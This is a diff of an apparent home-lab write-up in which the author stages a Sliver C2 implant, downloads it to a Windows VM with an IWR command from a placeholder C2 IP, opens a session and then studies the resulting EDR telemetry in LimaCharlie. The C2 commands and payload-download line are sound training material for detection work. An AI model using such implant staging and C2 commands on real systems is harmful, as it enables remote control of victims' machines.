@@ -265,12 +265,7 @@ Launching sliver c2:
 
 ![image](https://github.com/user-attachments/assets/714ddbcd-388d-49e0-a18c-d9f27d83287d)
 
-Generating my first C2 session payload (within the Sliver shell above). using my Linux VM’s IP address that I statically set
-
-![image](https://github.com/user-attachments/assets/b41c00e8-f096-4b12-ad5f-6e8e036fcfc2)
-
-
-This created a unique payload file, which I noted for future reference. The `implants` command within Sliver confirmed the configuration of my new payload:
+Generating my first C2 session payload (within the Sliver shell above). using my Linux VM’s IP address that I statically set. This created a unique payload file, which I noted for future reference. The `implants` command within Sliver confirmed the configuration of my new payload:
 
 ![image](https://github.com/user-attachments/assets/31cb3fe2-d898-4f42-9541-9197da402b38)
 
@@ -300,16 +295,25 @@ IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Download
 
 At this point, I took a snapshot of the Windows VM, naming it **"Malware staged"**. This ensured I could revert to a clean state if needed.
 
+![image](https://github.com/user-attachments/assets/0c3ed7f0-0033-4c5c-a239-8c06f641fdd6)
+
+![image](https://github.com/user-attachments/assets/fae2f22c-819b-4011-ac5b-a57048421c61)
+
+
 ---
 
 ## Executing the Payload
 
 Back on the Ubuntu VM, I relaunched Sliver and started the HTTP listener to catch callbacks from the implant:
 
+![image](https://github.com/user-attachments/assets/e1b93624-a28c-4dc2-8f55-cf9bae8a6b56)
+
+
 ```bash
 sliver-server
 http
 ```
+![image](https://github.com/user-attachments/assets/44992f2c-81a3-4817-b64a-0c17ef875305)
 
 Returning to the Windows VM, I executed the payload from the Administrative PowerShell console:
 
@@ -322,12 +326,15 @@ Within moments, the session checked in on the Sliver server. I verified the acti
 ```bash
 sessions
 ```
+![image](https://github.com/user-attachments/assets/877e8430-0d2c-4755-ae87-92a7f80a6d98)
+
 
 To interact with the session, I used:
 
 ```bash
 use [session_id]
 ```
+![image](https://github.com/user-attachments/assets/2a77308c-9cab-4f3e-8b0d-c2949989c714)
 
 ---
 
@@ -347,6 +354,9 @@ Once the session was active, I ran several basic commands to explore the victim 
    ```
    This confirmed the implant had administrative privileges, including the critical `SeDebugPrivilege`.
 
+![image](https://github.com/user-attachments/assets/d3acbbc0-98e4-4142-8b2e-c28e30197d67)
+
+
 3. **Working Directory:**
    ```bash
    pwd
@@ -356,7 +366,10 @@ Once the session was active, I ran several basic commands to explore the victim 
    ```bash
    netstat
    ```
-   Sliver highlighted its own process in green, making it easy to spot.
+
+![image](https://github.com/user-attachments/assets/f0071c75-3634-4e92-91bb-2fe1af75ef08)
+
+Sliver highlighted its own process in green, making it easy to spot.
 
 5. **Running Processes:**
    ```bash
@@ -364,23 +377,62 @@ Once the session was active, I ran several basic commands to explore the victim 
    ```
    Defensive tools, like LimaCharlie’s `rphcp.exe`, were marked in red.
 
+![image](https://github.com/user-attachments/assets/ce57698c-7ae9-4a95-a082-7ebe4141b569)
+
+![image](https://github.com/user-attachments/assets/e3273706-241a-490d-baaa-c34377ade46d)
+
 ---
 
 ## Observing EDR Telemetry in LimaCharlie
 
-With the C2 session established, I switched to LimaCharlie’s web UI to observe the telemetry:
+With the C2 session established, I switched to LimaCharlie’s web UI to observe the telemetry for the attacks:
 
 ### Processes Tab
 - The process tree displayed all running processes, highlighting the unsigned C2 implant.
 - Hovering over icons provided additional context, reinforcing the importance of understanding normal process behavior.
 
+![image](https://github.com/user-attachments/assets/9f2e1cee-a547-41e5-85b5-075fa0133dff)
+
+![image](https://github.com/user-attachments/assets/092b3f6b-23df-42fc-8c6d-834026015d77)
+
+![image](https://github.com/user-attachments/assets/3d7a4b17-6401-4ba7-b383-6aa0726c1a52)
+
+Here, we view EMOTIONAL_BATTLE.exe's (our generated payload) network connections:
+
+![image](https://github.com/user-attachments/assets/0121dd97-b17e-42e9-ba0f-2307bf53daf8)
+
+
 ### Network Tab
 - Active connections, including those initiated by the implant, were easily identifiable.
 - Searching for the implant’s name or C2 IP address quickly pinpointed suspicious activity.
 
+![image](https://github.com/user-attachments/assets/912ebd88-cd9e-4765-9618-4ee23a82614f)
+
+![image](https://github.com/user-attachments/assets/7088e7ce-2712-49af-9870-1edf19a453da)
+
+I search for the source's IP
+
+![image](https://github.com/user-attachments/assets/9046be84-920c-47c5-b38e-19b128a36f74)
+
+
+We can use this resource (findevil - know normal) or or https://lolbas-project.github.io/ or echotrail to learn more about what's unusual 
+
+![image](https://github.com/user-attachments/assets/0f4a362b-fa99-41ba-9248-32b482a59474)
+
+
+
 ### File System Tab
 - Browsed to the implant’s directory: `C:\Users\User\Downloads`.
 - Scanned the executable’s hash with VirusTotal. As expected, it wasn’t in the database, making it more suspicious.
+- Very important note I learned from the guide: As shown below, the option I selected queried VirusTotal for the hash of the EXE, meaning if the malware is common/well-known, it'll be found. However, "Item not found" is **NOT** an indication that the file is safe. It makes sense because we generated the payload ourselves, so it's unlikely to have been seen by VirusTotal before. This makes the file even more suspicious/dangerous as it likely means the malware is targeted or customly made. I am thankful for the guide to have taught me this. 
+
+![image](https://github.com/user-attachments/assets/457d2192-8706-49a0-997b-30689ac3605d)
+
+![image](https://github.com/user-attachments/assets/6535df81-f0dd-48b9-ac0c-4d669aa43166)
+
+![image](https://github.com/user-attachments/assets/c5341d38-2bcb-408f-b923-a0aa4ebf4647)
+
+
 
 ### Timeline Tab
 - Filtered logs by known Indicators of Compromise (IOCs) like the implant name and C2 IP.
